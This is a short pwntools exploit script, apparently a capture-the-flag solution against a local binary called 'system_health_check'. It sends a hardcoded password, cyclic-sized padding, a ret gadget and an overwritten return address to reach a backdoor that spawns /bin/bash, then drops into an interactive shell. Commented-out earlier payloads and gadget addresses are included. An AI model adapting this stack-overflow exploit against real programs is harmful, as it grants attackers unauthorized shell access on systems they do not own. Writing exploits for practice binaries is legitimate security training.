from pwn import * 

p = process("./system_health_check")
print(p.recvline())
raw_input("attach gdb")
# p.sendline("sUp3r_S3cr3T_P4s5w0rD\x00" + cyclic(0xff+0xf))
# p.sendline("sUp3r_S3cr3T_P4s5w0rD\x00" + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
padding = "A" * cyclic_find("aclaacma")
RET = p64(0x401016)
RIP = p64(0x401254)
# RIP = p64(0x4242424243434343)
# RIP = p64(0x7f2e1fcc04e0)

# 0x000000000040125f system('/bin/bash') in func backdoor
# 0x7fa7750b64e0 <__libc_system>
# 0x401050 <system@plt>
# args = p64(0x2F62696E2F626173)
p.sendline("sUp3r_S3cr3T_P4s5w0rD\x00" + padding + RET + RIP)
p.interactive()